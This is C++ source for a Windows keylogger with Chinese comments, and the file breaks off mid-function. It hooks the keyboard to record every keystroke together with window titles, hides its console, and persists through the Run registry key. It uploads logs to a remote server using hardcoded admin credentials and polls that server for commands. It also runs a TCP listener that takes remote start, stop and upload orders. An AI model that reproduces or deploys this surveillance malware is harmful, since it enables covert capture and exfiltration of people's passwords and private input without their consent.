#define UNICODE
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>
#include <fstream>
#include <filesystem>
#include <string>
#include <vector>
#include <regex>
#include <algorithm>
#include <curl/curl.h>
#include <nlohmann/json.hpp>    
#include <cstring>
#include <cstdio>
#include <sstream>
#include <time.h>
#include <map>
#include <shlwapi.h>
#include <shellapi.h>
#include <atomic>
#include <shlobj.h>          // SHGetFolderPath
#include <objbase.h>         // CoInitialize, CoUninitialize
#include <shobjidl.h>        // IShellLink
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "uuid.lib")

using json = nlohmann::json;
namespace fs = std::filesystem;

// defines whether the window is visible or not
// should be solved with makefile, not in this file
#define invisible // (visible / invisible)

// Defines whether you want to enable or disable 
// boot time waiting if running at system boot.
#define bootwait // (bootwait / nowait)

// defines which format to use for logging
// 0 for default, 10 for dec codes, 16 for hex codex
#define FORMAT 0

// defines if ignore mouseclicks
#define mouseignore

// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
// or you will get problems since every function uses this variable.

bool isRecording = true;
HHOOK _hook;

// 上传功能控制变量
std::atomic<bool> uploadEnabled{ false };
std::atomic<bool> uploadThreadRunning{ false };
HANDLE hUploadThread = NULL;        // 上传线程句柄

// 本地服务器控制变量
std::atomic<bool> serverRunning{ false };
HANDLE hServerThread = NULL;        // 服务器线程句柄
const int SERVER_PORT = 8888;       // 本地服务器端口

// ---------------------- 前向声明 ----------------------
size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s);
std::string readFileContent(const std::string& filePath);
std::string getExecutableDir();

// 本地服务器相关函数
DWORD WINAPI LocalServerThreadFunc(LPVOID lpParam);
DWORD WINAPI ClientHandlerThreadFunc(LPVOID lpParam);
bool SendDiscoveryPacket();
void ProcessServerCommand(const std::string& command, SOCKET clientSocket);
// ----------------------------------------------------

#if FORMAT == 0
const std::map<int, std::string> keyname{
    {VK_BACK, "[BACKSPACE]" },
    {VK_RETURN, "\n" },
    {VK_SPACE, "_" },
    {VK_TAB, "[TAB]" },
    {VK_SHIFT, "[SHIFT]" },
    {VK_LSHIFT, "[LSHIFT]" },
    {VK_RSHIFT, "[RSHIFT]" },
    {VK_CONTROL, "[CONTROL]" },
    {VK_LCONTROL, "[LCONTROL]" },
    {VK_RCONTROL, "[RCONTROL]" },
    {VK_MENU, "[ALT]" },
    {VK_LWIN, "[LWIN]" },
    {VK_RWIN, "[RWIN]" },
    {VK_ESCAPE, "[ESCAPE]" },
    {VK_END, "[END]" },
    {VK_HOME, "[HOME]" },
    {VK_LEFT, "[LEFT]" },
    {VK_RIGHT, "[RIGHT]" },
    {VK_UP, "[UP]" },
    {VK_DOWN, "[DOWN]" },
    {VK_PRIOR, "[PG_UP]" },
    {VK_NEXT, "[PG_DOWN]" },
    {VK_OEM_PERIOD, "." },
    {VK_DECIMAL, "." },
    {VK_OEM_PLUS, "+" },
    {VK_OEM_MINUS, "-" },
    {VK_ADD, "+" },
    {VK_SUBTRACT, "-" },
    {VK_CAPITAL, "[CAPSLOCK]" },
};
#endif
// 全局变量，用于存储托盘图标 ID 和窗口
static HWND g_hNotifyWnd = NULL;
static UINT g_nNotifyId = 0;

// 托盘窗口的消息处理函数
LRESULT CALLBACK NotifyWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    return DefWindowProc(hWnd, msg, wParam, lParam);
}

// 初始化托盘窗口，只调用一次
void InitNotifyWindow()
{
    if (g_hNotifyWnd != NULL) return;
    WNDCLASS wc = { 0 };
    wc.lpfnWndProc = NotifyWndProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = L"KeyloggerNotifyClass";
    RegisterClass(&wc);
    g_hNotifyWnd = CreateWindow(wc.lpszClassName, NULL, 0, 0, 0, 0, 0, NULL, NULL, wc.hInstance, NULL);
    if (g_hNotifyWnd) g_nNotifyId = (UINT)(ULONG_PTR)g_hNotifyWnd;
}

// 显示通知托盘消息，失败时显示 MessageBox
void ShowToastNotification(const std::wstring& title, const std::wstring& content)
{
    InitNotifyWindow();  // 确保托盘窗口存在
    if (!g_hNotifyWnd)
    {
        MessageBox(NULL, content.c_str(), title.c_str(), MB_OK);
        return;
    }

    NOTIFYICONDATAW nid = { sizeof(NOTIFYICONDATAW) };
    nid.hWnd = g_hNotifyWnd;
    nid.uID = g_nNotifyId;
    nid.uFlags = NIF_ICON | NIF_TIP | NIF_INFO;
    nid.dwInfoFlags = NIIF_INFO;
    wcscpy_s(nid.szInfo, content.c_str());
    wcscpy_s(nid.szInfoTitle, title.c_str());
    // 使用默认图标（可从资源文件加载，这里使用标准应用图标）
    nid.hIcon = LoadIcon(NULL, IDI_APPLICATION);

    // 添加托盘图标（如果已存在，则修改）
    if (!Shell_NotifyIconW(NIM_ADD, &nid))
    {
        // 添加失败，尝试修改为更新图标
        Shell_NotifyIconW(NIM_MODIFY, &nid);
    }
    else
    {
        // 成功添加图标，需要延迟删除以保证消息显示
        // 创建一个线程10秒后删除图标
        struct DelayedCleanupData {
            HWND hWnd;
            UINT uID;
        } *pData = new DelayedCleanupData{ g_hNotifyWnd, g_nNotifyId };
        HANDLE hThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
            DelayedCleanupData* data = (DelayedCleanupData*)p;
            Sleep(10000);  // 等待10秒，确保消息显示完整
            NOTIFYICONDATAW delNid = { sizeof(NOTIFYICONDATAW) };
            delNid.hWnd = data->hWnd;
            delNid.uID = data->uID;
            Shell_NotifyIconW(NIM_DELETE, &delNid);
            delete data;
            return 0;
            }, pData, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
}

// 在程序结束时清理托盘图标（可选，建议调用）
void CleanupNotifyIcon()
{
    if (g_hNotifyWnd)
    {
        NOTIFYICONDATAW nid = { sizeof(NOTIFYICONDATAW) };
        nid.hWnd = g_hNotifyWnd;
        nid.uID = g_nNotifyId;
        Shell_NotifyIconW(NIM_DELETE, &nid);
        DestroyWindow(g_hNotifyWnd);
        g_hNotifyWnd = NULL;
    }
}

KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);
std::ofstream output_file;

void ReleaseHook()
{
    UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke)
{
    std::stringstream output;
    static char lastwindow[256] = "";
#ifndef mouseignore 
    if ((key_stroke == 1) || (key_stroke == 2))
    {
        return 0; // ignore mouse clicks
    }
#endif
    HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout = NULL;

    if (foreground)
    {
        // get keyboard layout of the thread
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground)
    {
        char window_title[256];
        GetWindowTextA(foreground, (LPSTR)window_title, 256);

        if (strcmp(window_title, lastwindow) != 0)
        {
            strcpy_s(lastwindow, sizeof(lastwindow), window_title);
            // get time
            struct tm tm_info;
            time_t t = time(NULL);
            localtime_s(&tm_info, &t);
            char s[64];
            strftime(s, sizeof(s), "%FT%X%z", &tm_info);

            output << "\n\n[Window: " << window_title << " - at " << s << "] " << "\n";
        }
    }

#if FORMAT == 10
    output << '[' << key_stroke << ']';
#elif FORMAT == 16
    output << std::hex << "[" << key_stroke << ']';
#else
    if (keyname.find(key_stroke) != keyname.end())
    {
        output << keyname.at(key_stroke);
    }
    else
    {
        char key;
        // check caps lock
        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

        // check shift key
        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
            || (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
        {
            lowercase = !lowercase;
        }

        // map virtual key according to keyboard layout
        key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

        // tolower converts it to lowercase properly
        if (!lowercase)
        {
            key = tolower(key);
        }
        output << char(key);
    }
#endif
    // instead of opening and closing file handlers every time, keep file open and flush.
    output_file << output.str();
    output_file.flush();

    std::cout << output.str();

    return 0;
}

void Stealth()
{
#ifdef visible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
#endif

#ifdef invisible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
    FreeConsole();
#endif
}

// Function to check if the system is still booting up
bool IsSystemBooting()
{
    return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
}

// 自启动相关变量
const wchar_t* REG_RUN_PATH = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
const wchar_t* APP_NAME = L"MyKeylogger";

// 获取当前可执行文件路径
std::wstring GetModulePath()
{
    wchar_t path[MAX_PATH] = { 0 };
    GetModuleFileNameW(NULL, path, MAX_PATH);
    return std::wstring(path);
}

// 检查是否已设置自启动
bool IsAutoStartEnabled()
{
    HKEY hKey;
    bool enabled = false;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_RUN_PATH, 0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        wchar_t value[MAX_PATH];
        DWORD size = sizeof(value);
        if (RegQueryValueExW(hKey, APP_NAME, NULL, NULL, (LPBYTE)value, &size) == ERROR_SUCCESS)
        {
            enabled = (GetModulePath() == value);
        }
        RegCloseKey(hKey);
    }
    return enabled;
}

// 设置自启动状态
bool SetAutoStart(bool enable)
{
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_RUN_PATH, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS)
        return false;

    bool result = false;
    if (enable)
    {
        std::wstring path = GetModulePath();
        result = (RegSetValueExW(hKey, APP_NAME, 0, REG_SZ, (BYTE*)path.c_str(), (DWORD)((path.size() + 1) * sizeof(wchar_t))) == ERROR_SUCCESS);
    }
    else
    {
        result = (RegDeleteValueW(hKey, APP_NAME) == ERROR_SUCCESS);
    }
    RegCloseKey(hKey);
    return result;
}

// 静默模式相关变量
const wchar_t* SILENT_MODE_VALUE = L"SilentMode";

// 获取静默模式状态
bool IsSilentMode()
{
    HKEY hKey;
    DWORD value = 0, size = sizeof(value);
    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_RUN_PATH, 0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        if (RegQueryValueExW(hKey, SILENT_MODE_VALUE, NULL, NULL, (LPBYTE)&value, &size) == ERROR_SUCCESS)
        {
            RegCloseKey(hKey);
            return value == 1;
        }
        RegCloseKey(hKey);
    }
    return false;
}

// 设置静默模式状态
bool SetSilentMode(bool enable)
{
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_RUN_PATH, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS)
        return false;
    DWORD value = enable ? 1 : 0;
    bool result = (RegSetValueExW(hKey, SILENT_MODE_VALUE, 0, REG_DWORD, (BYTE*)&value, sizeof(value)) == ERROR_SUCCESS);
    RegCloseKey(hKey);
    return result;
}

// 获取本机 IPv4 地址，优先选择不是回环的 IPv4 地址，失败返回 "unknown"
std::string GetLocalIPAddress()
{
    std::string ip = "unknown";
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return ip;

    char hostname[256] = { 0 };
    if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR)
    {
        WSACleanup();
        return ip;
    }

    struct addrinfo hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET; // IPv4
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    struct addrinfo* result = nullptr;
    if (getaddrinfo(hostname, NULL, &hints, &result) != 0)
    {
        WSACleanup();
        return ip;
    }

    std::string fallback_ip = "unknown";

    for (struct addrinfo* ptr = result; ptr != nullptr; ptr = ptr->ai_next)
    {
        if (ptr->ai_family == AF_INET)
        {
            char ipstr[INET_ADDRSTRLEN] = { 0 };
            sockaddr_in* sa = (sockaddr_in*)ptr->ai_addr;
            InetNtopA(AF_INET, &sa->sin_addr, ipstr, INET_ADDRSTRLEN);
            std::string candidate(ipstr);

            // 优先选择以 "10.88." 开头的 IP
            if (candidate.rfind("10.88.", 0) == 0)
            {
                ip = candidate;
                break;
            }

            // 如果没有找到以 "10.88." 开头的 IP，则记录第一个非回环地址作为备用
            if (candidate != "127.0.0.1" && !candidate.empty() && fallback_ip == "unknown")
            {
                fallback_ip = candidate;
            }
        }
    }

    freeaddrinfo(result);
    WSACleanup();

    // 如果没有找到以 "10.88." 开头的 IP，使用第一个非回环地址
    if (ip == "unknown")
    {
        ip = fallback_ip;
    }

    return ip;
}

std::string GetDateString()
{
    char buf[32] = { 0 };
    time_t t = time(NULL);
    struct tm tm_info;
    localtime_s(&tm_info, &t);
    // 格式为YYYYMMDD
    strftime(buf, sizeof(buf), "%Y%m%d", &tm_info);
    return std::string(buf);
}

// 获取日志目录为%appdata%\Keylogger
std::string GetLogDirectory()
{
    wchar_t path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, path)))
    {
        std::wstring appdata(path);
        std::wstring logDirW = appdata + L"\\Keylogger";
        // 确保目录存在
        if (!fs::exists(logDirW))
        {
            fs::create_directories(logDirW);
        }
        // 转换为多字节字符串
        int size_needed = WideCharToMultiByte(CP_UTF8, 0, logDirW.c_str(), (int)logDirW.length(), NULL, 0, NULL, NULL);
        std::string logDir(size_needed, 0);
        WideCharToMultiByte(CP_UTF8, 0, logDirW.c_str(), (int)logDirW.length(), &logDir[0], size_needed, NULL, NULL);
        return logDir;
    }
    // 如果失败，返回当前目录
    return ".\\";
}

std::string MakeOutputFilename()
{
    std::string ip = GetLocalIPAddress();
    // 对 IP 中可能的路径分隔符进行处理，替换为 '-'
    for (char& c : ip)
    {
        if (c == '/' || c == '\\' || c == ':' || c == '*' || c == '?' || c == '"' || c == '<' || c == '>' || c == '|')
            c = '-';
    }
    std::string date = GetDateString();
    std::string filename = ip + "_" + date + ".log";
    // 拼接日志目录
    std::string logDir = GetLogDirectory();
    return logDir + "\\" + filename;
}

// ---------- 上传功能实现 ----------

// CURL 回调函数，用于接收响应
size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
    size_t newLength = size * nmemb;
    try {
        s->append((char*)contents, newLength);
    }
    catch (std::bad_alloc& e) {
        return 0;
    }
    return newLength;
}

// 读取文件内容到内存（用于上传）
std::string readFileContent(const std::string& filePath) {
    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        std::cerr << "无法打开文件: " << filePath << std::endl;
        return "";
    }
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);
    std::string buffer(size, '\0');
    if (!file.read(&buffer[0], size)) {
        std::cerr << "读取文件失败: " << filePath << std::endl;
        return "";
    }
    return buffer;
}

// 获取程序当前执行目录（注意：此函数与上传功能无关，此处仅作示例）
std::string getExecutableDir() {
    char exePath[MAX_PATH];
    DWORD len = GetModuleFileNameA(NULL, exePath, MAX_PATH);
    if (len == 0) {
        std::cerr << "获取程序路径失败，错误码: " << GetLastError() << std::endl;
        return "";
    }
    std::string path(exePath, len);
    size_t lastSlash = path.find_last_of("\\/");
    return (lastSlash != std::string::npos) ? path.substr(0, lastSlash + 1) : "";
}

// 筛选符合格式的日志文件并返回最新的一个
std::string findLatestLogFile(const std::string& dir) {
    if (dir.empty() || !fs::exists(dir) || !fs::is_directory(dir)) {
        std::cerr << "目录不存在或无效: " << dir << std::endl;
        return "";
    }

    // 定义正则表达式，匹配 <IP>_<YYYYMMDD>.log 格式
    std::regex logPattern(R"((\d+\.\d+\.\d+\.\d+)_(\d{8})\.log)");
    std::smatch match;

    std::vector<std::pair<std::string, std::string>> validLogs;  // 存储有效文件名和日期

    // 遍历目录下的所有文件
    for (const auto& entry : fs::directory_iterator(dir)) {
        if (entry.is_regular_file()) {  // 只处理文件
            std::string fileName = entry.path().filename().string();
            if (std::regex_match(fileName, match, logPattern)) {
                // 提取日期部分（第2个捕获组）
                std::string dateStr = match[2].str();
                validLogs.emplace_back(fileName, dateStr);
                std::cout << "发现符合格式的日志文件: " << fileName << "，日期: " << dateStr << "。" << std::endl;
            }
        }
    }

    if (validLogs.empty()) {
        std::cerr << "未找到符合格式的日志文件（<IP>_<YYYYMMDD>.log）。" << std::endl;
        return "";
    }

    // 按日期字符串降序排序，找到最新的日志
    std::sort(validLogs.begin(), validLogs.end(),
        [](const auto& a, const auto& b) {
            return a.second > b.second;  // 字符串直接比较，YYYYMMDD 格式可直接比较大小
        });

    // 拼接最新文件的完整路径
    return dir + "\\" + validLogs[0].first;
}

// 获取 token
std::string api_get() {
    CURL* curl = curl_easy_init();
    std::string response_string;
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "POST");
        curl_easy_setopt(curl, CURLOPT_URL, "http://10.88.202.73:5244/api/auth/login");
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

        struct curl_slist* headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        const char* data = R"({"username": "admin", "password": "adm1n5"})";
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);

        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);

        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            std::cerr << "登录请求失败: " << curl_easy_strerror(res) << std::endl;
        }
        else {
            try {
                json j = json::parse(response_string);
                if (j["code"] == 200 && j["data"].contains("token")) {
                    return j["data"]["token"];
                }
                else {
                    std::cerr << "登录失败: " << response_string << std::endl;
                }
            }
            catch (const std::exception& e) {
                std::cerr << "解析登录响应失败: " << e.what() << std::endl;
            }
        }
        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
    }
    else {
        std::cerr << "curl 初始化失败" << std::endl;
    }
    return "";
}

// 上传文件到服务器
bool uploadFile(const std::string& token, const std::string& localFilePath, const std::string& serverFilePath)
{
    if (token.empty()) {
        std::cerr << "token 为空，无法上传" << std::endl;
        return false;
    }

    std::string fileContent = readFileContent(localFilePath);
    if (fileContent.empty()) {
        return false;
    }

    CURL* curl = curl_easy_init();
    if (!curl) {
        std::cerr << "curl 初始化失败" << std::endl;
        return false;
    }

    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "PUT");
    curl_easy_setopt(curl, CURLOPT_URL, "http://10.88.202.73:5244/api/fs/put");
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

    struct curl_slist* headers = NULL;
    headers = curl_slist_append(headers, ("Authorization: " + token).c_str());
    headers = curl_slist_append(headers, ("File-Path: " + serverFilePath).c_str());
    headers = curl_slist_append(headers, ("Content-Length: " + std::to_string(fileContent.size())).c_str());
    headers = curl_slist_append(headers, "Content-Type: application/octet-stream");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, fileContent.data());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, fileContent.size());

    std::string response;
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    curl_slist_free_all(headers);

    if (res != CURLE_OK) {
        std::cerr << "上传失败: " << curl_easy_strerror(res) << std::endl;
        return false;
    }
    std::cout << "上传响应: " << response << std::endl;
    // 此处简单认为响应是成功的
    return true;
}

// 从服务器获取上传指令
bool checkServerUploadCommand()
{
    std::string token = api_get();
    if (token.empty()) {
        std::cerr << "获取 token 失败，无法检查上传指令" << std::endl;
        return false;
    }

    CURL* curl = curl_easy_init();
    if (!curl) {
        std::cerr << "curl 初始化失败" << std::endl;
        return false;
    }

    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "GET");
    curl_easy_setopt(curl, CURLOPT_URL, "http://10.88.202.73:5244/api/keylogger/upload-command");
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

    struct curl_slist* headers = NULL;
    headers = curl_slist_append(headers, ("Authorization: " + token).c_str());
    headers = curl_slist_append(headers, "Content-Type: application/json");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    std::string response;
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    curl_slist_free_all(headers);

    if (res != CURLE_OK) {
        std::cerr << "检查上传指令失败: " << curl_easy_strerror(res) << std::endl;
        return false;
    }

    try {
        json j = json::parse(response);
        if (j["code"] == 200 && j["data"].contains("upload")) {
            bool shouldUpload = j["data"]["upload"];
            std::cout << "服务器上传指令: " << (shouldUpload ? "开启" : "关闭") << std::endl;
            return shouldUpload;
        }
        else {
            std::cerr << "检查上传指令失败: " << response << std::endl;
        }
    }
    catch (const std::exception& e) {
        std::cerr << "解析上传指令响应失败: " << e.what() << std::endl;
    }

    return false;
}

// 向服务器注册Keylogger实例
bool registerKeylogger()
{
    std::string token = api_get();
    if (token.empty()) {
        std::cerr << "获取 token 失败，无法注册Keylogger" << std::endl;
        return false;
    }

    CURL* curl = curl_easy_init();
    if (!curl) {
        std::cerr << "curl 初始化失败" << std::endl;
        return false;
    }

    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "POST");
    curl_easy_setopt(curl, CURLOPT_URL, "http://10.88.202.73:5244/api/keylogger/register");
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

    struct curl_slist* headers = NULL;
    headers = curl_slist_append(headers, ("Authorization: " + token).c_str());
    headers = curl_slist_append(headers, "Content-Type: application/json");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    std::string ip = GetLocalIPAddress();
    json data = {
        {"ip", ip},
        {"hostname", ""},
        {"status", "active"}
    };
    std::string json_data = data.dump();
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_data.c_str());

    std::string response;
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    curl_slist_free_all(headers);

    if (res != CURLE_OK) {
        std::cerr << "注册Keylogger失败: " << curl_easy_strerror(res) << std::endl;
        return false;
    }

    try {
        json j = json::parse(response);
        if (j["code"] == 200) {
            std::cout << "Keylogger注册成功" << std::endl;
            return true;
        }
        else {
            std::cerr << "注册Keylogger失败: " << response << std::endl;
        }
    }
    catch (const std::exception& e) {
        std::cerr << "解析注册响应失败: " << e.what() << std::endl;
    }

    return false;
}

// 上传最新日志文件的封装函数
void uploadLatestLog()
{
    // 1. 获取 token
    std::string token = api_get();
    if (token.empty()) {
        std::cerr << "获取 token 失败，跳过上传" << std::endl;
        ShowToastNotification(L"上传错误", L"获取登录凭证失败，已自动关闭上传功能");
        uploadEnabled = false;
        uploadThreadRunning = false;
        return;
    }

    // 2. 获取日志目录
    std::string logDir = GetLogDirectory();
    if (logDir.empty()) return;

    // 3. 查找最新的日志文件
    std::string latestLogPath = findLatestLogFile(logDir);
    if (latestLogPath.empty()) return;

    // 4. 配置服务器路径
    fs::path logPath(latestLogPath);
    std::string fileName = logPath.filename().string();
    std::string serverFile = "/%E5%AD%A6%E7%94%9F%E7%9B%AE%E5%BD%95/log/" + fileName;

    // 5. 上传文件
    bool success = uploadFile(token, latestLogPath, serverFile);
    if (!success) {
        std::cerr << "上传失败，已自动关闭上传功能" << std::endl;
        ShowToastNotification(L"上传错误", L"文件上传失败，已自动关闭上传功能");
        uploadEnabled = false;
        uploadThreadRunning = false;
    }
}

// 上传线程函数
DWORD WINAPI UploadThreadFunc(LPVOID lpParam)
{
    while (uploadThreadRunning)
    {
        // 检查服务器上传指令
        bool shouldUpload = checkServerUploadCommand();

        if (shouldUpload) {
            if (!uploadEnabled) {
                uploadEnabled = true;
                ShowToastNotification(L"上传功能", L"服务器已开启上传功能");
            }
            uploadLatestLog();
        }
        else {
            if (uploadEnabled) {
                uploadEnabled = false;
                ShowToastNotification(L"上传功能", L"服务器已关闭上传功能");
            }
        }

        // 每300秒检查一次
        for (int i = 0; i < 300 && uploadThreadRunning; ++i)
            Sleep(1000);
    }
    uploadThreadRunning = false;
    return 0;
}

// 服务器检查线程函数
DWORD WINAPI ServerCheckThreadFunc(LPVOID lpParam)
{
    // 首先注册Keylogger
    registerKeylogger();

    // 然后启动上传线程
    if (!uploadThreadRunning) {
        uploadThreadRunning = true;
        hUploadThread = CreateThread(NULL, 0, UploadThreadFunc, NULL, 0, NULL);
        if (hUploadThread)
            CloseHandle(hUploadThread);
    }

    return 0;
}

// ---------- 本地服务器功能实现 ----------

// 发送服务器发现数据包
bool SendDiscoveryPacket()
{
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return false;

    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET)
    {
        WSACleanup();
        return false;
    }

    // 设置广播选项
    BOOL broadcast = TRUE;
    if (setsockopt(sock, SOL_SOCKET, SO_BROADCAST, (char*)&broadcast, sizeof(broadcast)) == SOCKET_ERROR)
    {
        closesocket(sock);
        WSACleanup();
        return false;
    }

    // 构建广播地址
    sockaddr_in broadcastAddr;
    memset(&broadcastAddr, 0, sizeof(broadcastAddr));
    broadcastAddr.sin_family = AF_INET;
    broadcastAddr.sin_port = htons(8889); // 发现服务端口
    broadcastAddr.sin_addr.s_addr = INADDR_BROADCAST;

    // 构建发现数据包
    std::string ip = GetLocalIPAddress();
    std::string hostname = "";
    std::string discoveryMsg = "KEYLOGGER_DISCOVERY:" + ip + ":" + std::to_string(SERVER_PORT);

    // 发送广播
    int sendResult = sendto(sock, discoveryMsg.c_str(), discoveryMsg.length(), 0,
        (sockaddr*)&broadcastAddr, sizeof(broadcastAddr));

    closesocket(sock);
    WSACleanup();

    return sendResult != SOCKET_ERROR;
}

// 处理服务器发来的指令
void ProcessServerCommand(const std::string& command, SOCKET clientSocket)
{
    std::cout << "收到服务器指令: " << command << std::endl;

    // 解析指令
    if (command == "UPLOAD_LOGS")
    {
        // 上传日志文件
        uploadLatestLog();
        const char* response = "UPLOAD_COMPLETED\n";
        send(clientSocket, response, strlen(response), 0);
    }
    else if (command == "START_RECORDING")
    {
        // 开始录制
        isRecording = true;
        ShowToastNotification(L"录制控制", L"服务器已启动录制");
        const char* response = "RECORDING_STARTED\n";
        send(clientSocket, response, strlen(response), 0);
    }
    else if (command == "STOP_RECORDING")
    {
        // 停止录制
        isRecording = false;
        ShowToastNotification(L"录制控制", L"服务器已停止录制");
        const char* response = "RECORDING_STOPPED\n";
        send(clientSocket, response, strlen(response), 0);
    }
    else if (command == "ENABLE_UPLOAD")
    {
        // 启用上传功能
        uploadEnabled = true;
        ShowToastNotification(L"上传控制", L"服务器已启用上传功能");
        const char* response = "UPLOAD_ENABLED\n";
        send(clientSocket, response, strlen(response), 0);
    }
    else if (command == "DISABLE_UPLOAD")
    {
        // 禁用上传功能
        uploadEnabled = false;
        ShowToastNotification(L"上传控制", L"服务器已禁用上传功能");
        const char* response = "UPLOAD_DISABLED\n";
        send(clientSocket, response, strlen(response), 0);
    }
    else if (command == "GET_STATUS")
    {
        // 获取当前状态
        std::string status = "STATUS:RECORDING=" + std::string(isRecording ? "TRUE" : "FALSE") + ";UPLOAD=" + std::string(uploadEnabled ? "TRUE" : "FALSE") + "\n";
        send(clientSocket, status.c_str(), status.length(), 0);
    }
    else
    {
        // 未知指令
        const char* response = "UNKNOWN_COMMAND\n";
        send(clientSocket, response, strlen(response), 0);
    }
}

// 客户端处理线程函数
DWORD WINAPI ClientHandlerThreadFunc(LPVOID lpParam)
{
    SOCKET clientSocket = (SOCKET)lpParam;
    char buffer[1024] = { 0 };

    while (serverRunning)
    {
        // 接收客户端数据
        int bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
        if (bytesReceived <= 0)
            break;

        // 处理接收到的指令
        buffer[bytesReceived] = '\0';
        std::string command(buffer);
        ProcessServerCommand(command, clientSocket);
    }

    closesocket(clientSocket);
    return 0;
}

// 本地服务器线程函数
DWORD WINAPI LocalServerThreadFunc(LPVOID lpParam)
{
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        std::cerr << "WSAStartup 失败" << std::endl;
        return 1;
    }

    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (serverSocket == INVALID_SOCKET)
    {
        std::cerr << "创建套接字失败" << std::endl;
        WSACleanup();
        return 1;
    }

    // 绑定端口
    sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(SERVER_PORT);

    if (bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
    {
        std::cerr << "绑定端口失败" << std::endl;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    // 开始监听
    if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR)
    {
        std::cerr << "监听失败" << std::endl;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    std::cout << "本地服务器已启动，监听端口: " << SERVER_PORT << std::endl;
    ShowToastNotification(L"本地服务器", L"本地服务器已启动，监听端口: " + std::to_wstring(SERVER_PORT));

    // 发送服务器发现数据包
